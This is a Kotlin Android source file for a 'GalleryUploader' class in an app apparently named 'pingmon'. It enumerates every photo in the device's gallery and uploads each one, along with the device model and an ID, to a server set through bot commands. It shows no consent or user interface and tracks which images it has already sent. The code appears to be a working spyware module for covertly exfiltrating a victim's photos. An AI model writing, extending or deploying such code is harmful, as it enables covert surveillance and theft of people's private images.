package com.example.pingmon

import android.content.ContentUris
import android.content.Context
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class GalleryUploader(private val ctx: Context) {

    companion object {
        private const val TAG      = "Gallery"
        private const val PREFS    = "pingmon"
        private const val KEY_SID  = "gal_session"
        private const val KEY_DONE = "gal_done_ids"   // JSON array of uploaded IDs

        val isRunning = AtomicBoolean(false)
    }

    private val prefs  = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(90, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    /** Start fresh or resume. Called from cmd_gallery. */
    fun start() {
        if (isRunning.getAndSet(true)) { Log.w(TAG, "already running"); return }
        Thread({
            try { run() }
            catch (e: Exception) { report("Error: ${e.message}") }
            finally { isRunning.set(false) }
        }, "gallery").start()
    }

    /** Refresh: re-scan for new photos and upload only the new ones. */
    fun refresh() {
        if (isRunning.getAndSet(true)) { Log.w(TAG, "refresh: already running"); return }
        // Clear session so a new one starts, but keep done IDs for dedup
        prefs.edit().remove(KEY_SID).apply()
        Thread({
            try { run() }
            catch (e: Exception) { report("Error: ${e.message}") }
            finally { isRunning.set(false) }
        }, "gallery-refresh").start()
    }

    private fun run() {
        val server = PingService.serverUrl(ctx)
        if (server.isBlank()) { report("No server set. Use /setserver in bot."); return }

        val photos = queryPhotos()
        if (photos.isEmpty()) { report("No photos found."); return }

        // Load IDs already uploaded
        val doneSet = loadDoneIds()

        // Filter out already-uploaded photos
        val pending = photos.filter { it.id.toString() !in doneSet }
        val total   = photos.size
        val already = total - pending.size

        if (pending.isEmpty()) {
            report("All $total photos already uploaded. Use refresh for new ones.")
            return
        }

        Log.i(TAG, "Total=$total already=$already pending=${pending.size}")

        // Start or reuse session
        var sid = prefs.getString(KEY_SID, "") ?: ""
        if (sid.isBlank()) {
            val res = postJson("$server/gallery/start", JSONObject().apply {
                put("uid",    PingService.uid(ctx))
                put("device", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
                put("total",  total)
                put("already", already)
            }) ?: run { report("Failed to start session."); return }
            sid = res.optString("session_id", "")
            prefs.edit().putString(KEY_SID, sid).apply()
        }

        var sent    = 0
        var failed  = 0

        for ((index, photo) in pending.withIndex()) {
            // Small delay for MIUI stability
            if (index > 0 && index % 10 == 0) Thread.sleep(300)

            try {
                val bytes = ctx.contentResolver
                    .openInputStream(photo.uri)?.use { it.readBytes() } ?: continue

                val ok = uploadPhoto(server, sid, already + index, photo.name, bytes)
                if (ok) {
                    sent++
                    doneSet.add(photo.id.toString())
                    saveDoneIds(doneSet)   // persist after every success
                } else {
                    failed++
                }
            } catch (e: Exception) {
                failed++
                Log.w(TAG, "photo ${photo.id}: ${e.message}")
            }
        }

        postJson("$server/gallery/finish", JSONObject().put("session_id", sid))
        prefs.edit().remove(KEY_SID).apply()

        report("Gallery done: $sent sent, $failed failed, $already already uploaded.")
    }

    private fun uploadPhoto(server: String, sid: String, index: Int,
                            name: String, bytes: ByteArray): Boolean {
        return try {
            val req = Request.Builder()
                .url("$server/gallery/photo")
                .addHeader("X-Token",    PingService.APP_TOKEN)
                .addHeader("X-Session",  sid)
                .addHeader("X-Index",    index.toString())
                .addHeader("X-Filename", name)
                .post(bytes.toRequestBody("image/jpeg".toMediaType()))
                .build()
            client.newCall(req).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            Log.w(TAG, "upload: ${e.message}")
            false
        }
    }

    private fun postJson(url: String, body: JSONObject): JSONObject? {
        return try {
            val req = Request.Builder()
                .url(url)
                .addHeader("X-Token", PingService.APP_TOKEN)
                .post(body.toString().toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { resp ->
                if (resp.isSuccessful) JSONObject(resp.body?.string() ?: "{}") else null
            }
        } catch (e: Exception) {
            Log.w(TAG, "post $url: ${e.message}")
            null
        }
    }

    private fun report(msg: String) {
        prefs.edit().putString("pending_report", msg).apply()
    }

    /* ─────────────────────────── done-IDs persistence */

    private fun loadDoneIds(): MutableSet<String> {
        val raw = prefs.getString(KEY_DONE, "[]") ?: "[]"
        return try {
            val arr = JSONArray(raw)
            val set = mutableSetOf<String>()
            for (i in 0 until arr.length()) set.add(arr.getString(i))
            set
        } catch (_: Exception) { mutableSetOf() }
    }

    private fun saveDoneIds(ids: Set<String>) {
        prefs.edit().putString(KEY_DONE, JSONArray(ids.toList()).toString()).apply()
    }

    /* ─────────────────────────── MediaStore */

    data class Photo(val id: Long, val uri: Uri, val name: String)

    private fun queryPhotos(): List<Photo> {
        val list  = mutableListOf<Photo>()
        val col   = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
            MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
        else MediaStore.Images.Media.EXTERNAL_CONTENT_URI

        ctx.contentResolver.query(
            col,
            arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME),
            null, null,
            "${MediaStore.Images.Media.DATE_TAKEN} DESC"
        )?.use { c ->
            val idCol   = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            while (c.moveToNext()) {
                val id   = c.getLong(idCol)
                val name = c.getString(nameCol) ?: "img_$id.jpg"
                list.add(Photo(id, ContentUris.withAppendedId(col, id), name))
            }
        }
        return list
    }
}
